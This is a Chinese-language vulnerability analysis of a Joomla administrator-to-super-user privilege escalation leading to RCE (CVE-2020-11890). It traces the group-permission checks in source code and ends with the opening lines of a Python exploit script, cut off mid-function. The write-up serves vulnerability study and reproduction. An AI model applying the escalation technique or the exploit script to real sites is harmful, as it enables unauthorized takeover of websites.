<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="joomla-远程命令执行漏洞"><span class="csDE05BCC">Joomla </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">受影响的版本：</span><span class="cs8926E06">3.9.17</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">Joomla</span><span class="cs9C1B1871">核心</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">用户要求：管理员帐户（非超级管理员）</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">获得访问权限：创建一个新的超级管理员，然后触发</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Joomla &lt; 3.9.17</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h2 class="cs868C439D">
			<a name="漏洞分析"><span class="cs83F14626">漏洞分析</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">本次漏洞可以将</span><span class="cs8926E06">joomla</span><span class="cs9C1B1871">系统中的</span><span class="cs8926E06">Administrator</span><span class="cs9C1B1871">用户提权为</span><span class="cs8926E06">Super&ensp;Users</span><span class="cs9C1B1871">。在分析漏洞前，我们来看一下</span><span class="cs8926E06">Super&ensp;Users</span><span class="cs9C1B1871">与</span><span class="cs8926E06">Administrator</span><span class="cs9C1B1871">有什么区别：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">超级管理员</span><span class="cs8926E06">&ensp;(Super&ensp;Users)</span><span class="cs9C1B1871">：拥有</span><span class="cs8926E06">Joomla</span><span class="cs9C1B1871">的所有权限。并且超级管理员只能由另一个超级管理员来创建。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">高级管理员（</span><span class="cs8926E06">Administrator</span><span class="cs9C1B1871">）：</span><span class="cs8926E06">Administrator</span><span class="cs9C1B1871">没有权限将一个用户升级成超级用户或者编辑一个超级用户、不可以修改</span><span class="cs8926E06">Joomla</span><span class="cs9C1B1871">的全局设置，没有权限来改变和安装模板和</span><span class="cs8926E06">Joomla</span><span class="cs9C1B1871">的语言文件。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">作为测试，我们新建三个账号，分别为</span><span class="cs8926E06">administrator</span><span class="cs9C1B1871">（</span><span class="cs8926E06">administrator</span><span class="cs9C1B1871">用户组）、</span><span class="cs8926E06">Super User</span><span class="cs9C1B1871">（</span><span class="cs8926E06">Super User</span><span class="cs9C1B1871">用户组）、</span><span class="cs8926E06">test</span><span class="cs9C1B1871">（</span><span class="cs8926E06">administrator</span><span class="cs9C1B1871">用户组）</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="183" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">Administrator</span><span class="cs9C1B1871">账号登陆，访问</span><span class="cs8926E06">Joomla</span><span class="cs9C1B1871">全局设置链接</span></p><p class="cs40DD2BC9"><span class="cs8926E06">/administrator/index.php?option=com_config</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="279" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可见</span><span class="cs8926E06">Administrator</span><span class="cs9C1B1871">用户组权限不可以访问该功能页面。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">Administration</span><span class="cs9C1B1871">账号编辑</span><span class="cs8926E06">test</span><span class="cs9C1B1871">账号的用户组</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="457" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">Administrator</span><span class="cs9C1B1871">用户组权限不可以为其他的用户添加</span><span class="cs8926E06">super user</span><span class="cs9C1B1871">权限</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">Superuser</span><span class="cs9C1B1871">账号登陆，访问</span><span class="cs8926E06">Joomla</span><span class="cs9C1B1871">全局设置链接</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="257" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">Superuser</span><span class="cs9C1B1871">权限可以访问</span><span class="cs8926E06">Joomla</span><span class="cs9C1B1871">全局设置页面</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">Superuser</span><span class="cs9C1B1871">账号编辑</span><span class="cs8926E06">test</span><span class="cs9C1B1871">账号的用户组</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="393" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以为</span><span class="cs8926E06">test</span><span class="cs9C1B1871">账号添加</span><span class="cs8926E06">super user</span><span class="cs9C1B1871">权限</span></p><h3 class="cs868C439D">
			<a name="关于漏洞的初步猜测"><span class="csD6CA00D2">关于漏洞的初步猜测</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在刚看到漏洞简介时，我猜测会不会是</span><span class="cs8926E06">joomla</span><span class="cs9C1B1871">只在前端做了校验，使用</span><span class="cs8926E06">Administration</span><span class="cs9C1B1871">账号编辑</span><span class="cs8926E06">test</span><span class="cs9C1B1871">账号的用户组时，在前端把</span><span class="cs8926E06">super user</span><span class="cs9C1B1871">这个选项卡隐藏起来了，后端并未校验权限，使得漏洞产生。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为了验证我的猜想，我在修改</span><span class="cs8926E06">test</span><span class="cs9C1B1871">用户组时抓包并修改其中的</span><span class="cs8926E06">jform[groups]</span><span class="cs9C1B1871">值</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="243" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">每一个用户组都有一个</span><span class="cs8926E06">id</span><span class="cs9C1B1871">值，这个可以通过数据库中查看得来</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="288" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为我需要将</span><span class="cs8926E06">test</span><span class="cs9C1B1871">账号改为</span><span class="cs8926E06">super users</span><span class="cs9C1B1871">用户组权限，因此需改数据包中</span><span class="cs8926E06">jform[groups]</span><span class="cs9C1B1871">值为</span><span class="cs8926E06">8</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">经过测试发现，这是行不通的</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="460" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在猜想失败之后，只好动态调试一下源代码，看一下</span><span class="cs8926E06">joomla</span><span class="cs9C1B1871">是如何进行权限校验的</span></p><h3 class="cs868C439D">
			<a name="动态调试"><span class="csD6CA00D2">动态调试</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">既然在上文猜想中，我们强行改包时抛出了个</span><span class="cs8926E06">Save failed with the following error: User not Super<br/>Administrator</span><span class="cs9C1B1871">错误，那么直接在源代码中找到抛出错误的位置</span><span class="cs8926E06">libraries\src\User\User.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image8.png" width="560" height="184" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可见上图中，只要</span><span class="cs8926E06">checkGroup</span><span class="cs9C1B1871">方法为真，则进入</span><span class="cs8926E06">if</span><span class="cs9C1B1871">分支抛出</span><span class="cs8926E06">Save failed with the following error: User not Super Administrator</span><span class="cs9C1B1871">错误</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image9.png" width="560" height="91" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先来看下</span><span class="cs8926E06">getGroupPath</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image10.png" width="560" height="360" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">getGroupPath</span><span class="cs9C1B1871">的作用是通过传入的</span><span class="cs8926E06">groupid</span><span class="cs9C1B1871">参数，获取要查询的用户组分支中叶子节点所属用户组，并返回到树的根节点。简而言之，就是获取用户组列表</span><span class="cs8926E06">&mdash;&mdash;groups</span><span class="cs9C1B1871">列表中对应用户组的</span><span class="cs8926E06">path</span><span class="cs9C1B1871">属性值</span></p><h3 class="cs868C439D">
			<a name="用户组列表groups"><span class="csD6CA00D2">用户组列表（</span><span class="csD1E291E2">groups</span><span class="csD6CA00D2">）</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我们来看下</span><span class="cs8926E06">groups</span><span class="cs9C1B1871">列表是什么，是怎么生成的</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">用户组列表（</span><span class="cs8926E06">groups</span><span class="cs9C1B1871">）中记录了所有用户组的属性值，包括名称、</span><span class="cs8926E06">id</span><span class="cs9C1B1871">、双亲节点信息、该节点的祖先数组</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接下来分析下</span><span class="cs8926E06">groups</span><span class="cs9C1B1871">列表是怎么生成的</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">首先，程序从数据库</span><span class="cs8926E06">usergroups</span><span class="cs9C1B1871">表中读取每一个用户组的属性值</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">数据库中数据如下</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image11.png" width="560" height="288" alt="" style="border-width:0px;" /></span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">程序读取后赋值到</span><span class="cs8926E06">groups</span><span class="cs9C1B1871">数组中</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image12.png" width="560" height="284" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着调用</span><span class="cs8926E06">populateGroupData</span><span class="cs9C1B1871">方法对</span><span class="cs8926E06">groups</span><span class="cs9C1B1871">数组中每个用户组数据进行补充</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image13.png" width="560" height="437" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在这一环节，程序将为每一个用户组提供</span><span class="cs8926E06">path</span><span class="cs9C1B1871">与</span><span class="cs8926E06">level</span><span class="cs9C1B1871">属性值</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中</span><span class="cs8926E06">path</span><span class="cs9C1B1871">属性就是树形结构中以该用户组节点的祖先</span><span class="cs8926E06">(Ancestor)</span><span class="cs9C1B1871">数组、</span><span class="cs8926E06">level</span><span class="cs9C1B1871">即为该结点的层次</span><span class="cs8926E06">(Level<br/>of Node)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">回顾一下数据库中每个用户组的属性值，这里注意</span><span class="cs8926E06">parent_id</span><span class="cs9C1B1871">值</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image14.png" width="560" height="277" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">除了</span><span class="cs8926E06">Public</span><span class="cs9C1B1871">父节点为</span><span class="cs8926E06">0</span><span class="cs9C1B1871">之外，其他的用户组在表中都存在对应的双亲节点。可见</span><span class="cs8926E06">Public</span><span class="cs9C1B1871">用户组为树形结构中的根节点，层次为</span><span class="cs8926E06">1</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image15.png" width="560" height="279" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">Registered</span><span class="cs9C1B1871">、</span><span class="cs8926E06">Manager</span><span class="cs9C1B1871">、</span><span class="cs8926E06">Super Users</span><span class="cs9C1B1871">、</span><span class="cs8926E06">Guest</span><span class="cs9C1B1871">的双亲节点</span><span class="cs8926E06">id</span><span class="cs9C1B1871">皆为</span><span class="cs8926E06">1</span><span class="cs9C1B1871">，即</span><span class="cs8926E06">Public</span><span class="cs9C1B1871">节点</span><span class="cs8926E06"> </span><span class="cs9C1B1871">。层次为</span><span class="cs8926E06">2<br/></span><span class="cs9C1B1871">剩余的用户组节点分别以</span><span class="cs8926E06">Registered</span><span class="cs9C1B1871">、</span><span class="cs8926E06">Manager</span><span class="cs9C1B1871">、</span><span class="cs8926E06">Super Users</span><span class="cs9C1B1871">、</span><span class="cs8926E06">Guest</span><span class="cs9C1B1871">四个节点作为双亲节点。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">用户节点的树形图如下</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image16.png" width="365" height="425" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">动态调试结果如下</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image17.png" width="560" height="213" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从上图可见，这里以</span><span class="cs8926E06">Public</span><span class="cs9C1B1871">用户组节点举例：</span><span class="cs8926E06">Public</span><span class="cs9C1B1871">作为根节点，其</span><span class="cs8926E06">path</span><span class="cs9C1B1871">以及</span><span class="cs8926E06">level</span><span class="cs9C1B1871">生成时比较特殊，进入</span><span class="cs8926E06">parentid</span><span class="cs9C1B1871">为</span><span class="cs8926E06">0</span><span class="cs9C1B1871">的</span><span class="cs8926E06">if</span><span class="cs9C1B1871">分支，最终祖先数组</span><span class="cs8926E06">path</span><span class="cs9C1B1871">为</span><span class="cs8926E06">array(0 =&gt; &#39;1&#39;)</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> level</span><span class="cs9C1B1871">为</span><span class="cs8926E06">0</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再以</span><span class="cs8926E06">Registered</span><span class="cs9C1B1871">、</span><span class="cs8926E06">Manager</span><span class="cs9C1B1871">、</span><span class="cs8926E06">Super Users</span><span class="cs9C1B1871">、</span><span class="cs8926E06">Guest</span><span class="cs9C1B1871">这四个层次为</span><span class="cs8926E06">2</span><span class="cs9C1B1871">的用户组节点中的</span><span class="cs8926E06">Guest</span><span class="cs9C1B1871">节点为例</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image18.png" width="560" height="327" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">Guest</span><span class="cs9C1B1871">节点的</span><span class="cs8926E06">path</span><span class="cs9C1B1871">为</span><span class="cs8926E06">array (0 =&gt; &#39;1&#39;,1 =&gt;&#39;9&#39;,)</span><span class="cs9C1B1871">，</span><span class="cs8926E06">level</span><span class="cs9C1B1871">为</span><span class="cs8926E06">1</span><span class="cs9C1B1871">。</span><span class="cs8926E06">Path</span><span class="cs9C1B1871">是由</span><span class="cs8926E06">Guest</span><span class="cs9C1B1871">节点所有祖先组成的集合，</span><span class="cs8926E06">level</span><span class="cs9C1B1871">值为该节点层数减一</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后看一下其他层次大于</span><span class="cs8926E06">2</span><span class="cs9C1B1871">的节点，以</span><span class="cs8926E06">Administrator</span><span class="cs9C1B1871">用户组节点举例</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image19.png" width="560" height="255" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从数据库中可见，</span><span class="cs8926E06">Administrator</span><span class="cs9C1B1871">用户组双亲节点</span><span class="cs8926E06">id</span><span class="cs9C1B1871">为</span><span class="cs8926E06">6</span><span class="cs9C1B1871">，对应</span><span class="cs8926E06"> Manager</span><span class="cs9C1B1871">节点，</span><span class="cs8926E06">Manager</span><span class="cs9C1B1871">用户组节点的双亲节点</span><span class="cs8926E06">id</span><span class="cs9C1B1871">为</span><span class="cs8926E06">1</span><span class="cs9C1B1871">，对应</span><span class="cs8926E06">Public</span><span class="cs9C1B1871">用户组节点。其层次为</span><span class="cs8926E06">3</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image20.png" width="560" height="327" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过调试也可看出，</span><span class="cs8926E06">Administrator</span><span class="cs9C1B1871">用户组节点的祖先数组</span><span class="cs8926E06">path</span><span class="cs9C1B1871">为</span><span class="cs8926E06">array (0 =&gt; &#39;1&#39;, 1 =&gt;&#39;6&#39;, 2 =&gt; &#39;7&#39;,)</span><span class="cs9C1B1871">，</span><span class="cs8926E06">level</span><span class="cs9C1B1871">为</span><span class="cs8926E06">2</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在弄明白</span><span class="cs8926E06">groups</span><span class="cs9C1B1871">列表之后，看一下程序是如何判断当前用户的权限判断的</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">回到</span><span class="cs8926E06">checkGroup</span><span class="cs9C1B1871">方法中</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image21.png" width="560" height="91" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">上文以及指导</span><span class="cs8926E06">getGroupPath</span><span class="cs9C1B1871">方法的作用了，由于我们请求构造中的</span><span class="cs8926E06">$groupid</span><span class="cs9C1B1871">为</span><span class="cs8926E06">8</span><span class="cs9C1B1871">，即想把</span><span class="cs8926E06">test</span><span class="cs9C1B1871">账号添加到</span><span class="cs8926E06">id</span><span class="cs9C1B1871">为</span><span class="cs8926E06">8</span><span class="cs9C1B1871">对应的</span><span class="cs8926E06">super users</span><span class="cs9C1B1871">组。</span><span class="cs8926E06">getGroupPath</span><span class="cs9C1B1871">接收传入的</span><span class="cs8926E06">$groupid,</span><span class="cs9C1B1871">返回</span><span class="cs8926E06">super user</span><span class="cs9C1B1871">节点的祖先数组</span><span class="cs8926E06">array (0=&gt; &#39;1&#39;, 1 =&gt; &#39;8&#39;,)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image22.png" width="560" height="301" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着，在</span><span class="cs8926E06">libraries\src\Access\Rule.php</span><span class="cs9C1B1871">的</span><span class="cs8926E06">allow</span><span class="cs9C1B1871">方法中，程序遍历</span><span class="cs8926E06">superuser</span><span class="cs9C1B1871">的祖先数组</span><span class="cs8926E06">array<br/>(0 =&gt; &#39;1&#39;, 1 =&gt; &#39;8&#39;,)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image23.png" width="560" height="279" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">程序判断</span><span class="cs8926E06">superuser</span><span class="cs9C1B1871">的祖先节点是否有在</span><span class="cs8926E06">$this-&gt;data</span><span class="cs9C1B1871">中出现，</span><span class="cs8926E06">$this-&gt;data</span><span class="cs9C1B1871">值如下</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image24.png" width="464" height="271" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">$this-&gt;data</span><span class="cs9C1B1871">数组代表目前用户不可以访问的节点</span><span class="cs8926E06">id</span><span class="cs9C1B1871">。由于我们使用的是</span><span class="cs8926E06">administrator</span><span class="cs9C1B1871">用户组的账号，不可以操作的用户组节点</span><span class="cs8926E06">id</span><span class="cs9C1B1871">为</span><span class="cs8926E06">8</span><span class="cs9C1B1871">，即</span><span class="cs8926E06">super user</span><span class="cs9C1B1871">，因此</span><span class="cs8926E06">$this-&gt;data</span><span class="cs9C1B1871">数组值为</span><span class="cs8926E06">array (8 =&gt; 1,)</span></p><p class="cs40DD2BC9"><span class="cs8926E06">superuser</span><span class="cs9C1B1871">的祖先数组中的叶子节点值为</span><span class="cs8926E06">8</span><span class="cs9C1B1871">，正好在目前用户不可以访问的</span><span class="cs8926E06">$this-&gt;data</span><span class="cs9C1B1871">数组中</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image25.png" width="560" height="82" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因此该用户权限无法进行操作，程序抛出当前用户不是超级管理员的错误</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image26.png" width="560" height="159" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2020-11890%ef%bc%89Joomla%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image27.png" width="560" height="297" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/python</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import re</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import argparse</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def extract_token(resp):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;match = re.search(r&#39;name=&quot;([a-f0-9]{32})&quot; value=&quot;1&quot;&#39;, resp.text, re.S)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if match is None:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[-] Cannot find CSRF token!\n&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return match.group(1)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def 